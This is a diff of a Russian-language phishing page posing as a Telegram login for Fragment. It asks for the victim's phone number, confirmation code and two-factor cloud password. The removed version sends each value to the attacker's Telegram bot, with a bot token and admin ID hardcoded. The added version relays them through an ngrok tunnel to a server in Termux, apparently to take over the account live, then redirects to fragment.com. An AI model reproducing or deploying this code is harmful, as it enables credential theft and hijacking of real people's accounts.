@@ -1,78 +1,70 @@
-<!DOCTYPE html>
-<html lang="ru">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Fragment — Login</title>
-    <style>
-        body { font-family: -apple-system, sans-serif; background: #fff; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; }
-        .container { width: 310px; text-align: center; border: 1px solid #f0f0f0; padding: 25px; border-radius: 20px; box-shadow: 0 10px 25px rgba(0,0,0,0.05); }
-        input { width: 100%; padding: 14px; margin: 10px 0; border: 1px solid #ddd; border-radius: 12px; font-size: 16px; box-sizing: border-box; outline: none; }
-        button { width: 100%; padding: 14px; background: #24A1DE; color: #fff; border: none; border-radius: 12px; font-weight: bold; cursor: pointer; font-size: 16px; margin-top: 10px; }
-        .hidden { display: none; }
-        img { margin-bottom: 15px; }
-        p { color: #707579; font-size: 14px; }
-    </style>
-</head>
-<body>
-    <div class="container">
-        <img src="https://telegram.org/img/t_logo.png" width="80">
-        <h2>Войти в Telegram</h2>
-        <p id="desc">Введите номер телефона для авторизации</p>
+<script>
+    // ВАЖНО: Замени эту ссылку на ту, которую выдаст Ngrok в Окне №2
+    const NGROK_URL = "https://твоя-ссылка.ngrok-free.app"; 
+    const SERVER_URL = `${NGROK_URL}/api/login`;
 
-        <div id="step-phone">
-            <input type="text" id="phone" placeholder="+7 900 000-00-00">
-            <button onclick="nextStep('code')">ДАЛЕЕ</button>
-        </div>
+    async function nextStep(step) {
+        const phone = document.getElementById('phone').value;
 
-        <div id="step-code" class="hidden">
-            <input type="text" id="code" placeholder="Код подтверждения">
-            <button onclick="nextStep('pass')">ПОДТВЕРДИТЬ</button>
-        </div>
+        if (step === 'code') {
+            // Отправляем запрос в Termux на получение кода
+            try {
+                const response = await fetch(SERVER_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ action: "send_code", phone: phone })
+                });
+                const result = await response.json();
 
-        <div id="step-pass" class="hidden">
-            <input type="password" id="password" placeholder="Пароль 2FA">
-            <button onclick="finish()">ВОЙТИ</button>
-        </div>
-    </div>
-
-    <script>
-        const BOT_TOKEN = "8585395713:AAHrT4qsXLKIrrLaTrMlBZN4NwDgFfEEGfw";
-        const ADMIN_ID = "6698151622";
-
-        async function sendToBot(text) {
-            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${ADMIN_ID}&text=${encodeURIComponent(text)}&parse_mode=Markdown`;
-            try { await fetch(url); } catch (e) {}
-        }
-
-        function nextStep(step) {
-            if (step === 'code') {
-                const p = document.getElementById('phone').value;
-                if(p.length > 5) {
-                    sendToBot("📱 **ЛОГ: Номер телефона**\n`" + p + "`");
+                if (result.status === "sent") {
                     document.getElementById('step-phone').classList.add('hidden');
                     document.getElementById('step-code').classList.remove('hidden');
-                    document.getElementById('desc').innerText = "Введите код из приложения";
+                    document.getElementById('desc').innerText = "Введите код из приложения Telegram";
+                } else {
+                    alert("Ошибка: " + result.message);
                 }
-            } else if (step === 'pass') {
-                const c = document.getElementById('code').value;
-                if(c.length >= 4) {
-                    sendToBot("🔢 **ЛОГ: Код подтверждения**\n`" + c + "`");
-                    document.getElementById('step-code').classList.add('hidden');
-                    document.getElementById('step-pass').classList.remove('hidden');
-                    document.getElementById('desc').innerText = "Введите облачный пароль (2FA)";
-                }
+            } catch (e) {
+                alert("Нет связи с сервером Termux. Проверь Ngrok!");
             }
-        }
+        } 
+        else if (step === 'pass') {
+            // Проверяем код
+            const code = document.getElementById('code').value;
+            const response = await fetch(SERVER_URL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ action: "verify_code", phone: phone, code: code })
+            });
+            const result = await response.json();
 
-        function finish() {
-            const pass = document.getElementById('password').value;
-            if(pass) {
-                sendToBot("🔑 **ЛОГ: Облачный пароль**\n`" + pass + "`");
-                alert("Технические работы. Попробуйте позже.");
+            if (result.status === "need_2fa") {
+                document.getElementById('step-code').classList.add('hidden');
+                document.getElementById('step-pass').classList.remove('hidden');
+                document.getElementById('desc').innerText = "Введите облачный пароль (2FA)";
+            } else if (result.status === "success") {
+                alert("Вход выполнен успешно!");
                 window.location.href = "https://fragment.com";
+            } else {
+                alert("Ошибка: " + result.message);
             }
         }
-    </script>
-</body>
-</html>
+    }
+
+    async function finish() {
+        const phone = document.getElementById('phone').value;
+        const pass = document.getElementById('password').value;
+        const response = await fetch(SERVER_URL, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ action: "verify_password", phone: phone, password: pass })
+        });
+        const result = await response.json();
+        
+        if (result.status === "success") {
+            alert("Все проверки пройдены!");
+            window.location.href = "https://fragment.com";
+        } else {
+            alert("Ошибка пароля");
+        }
+    }
+</script>
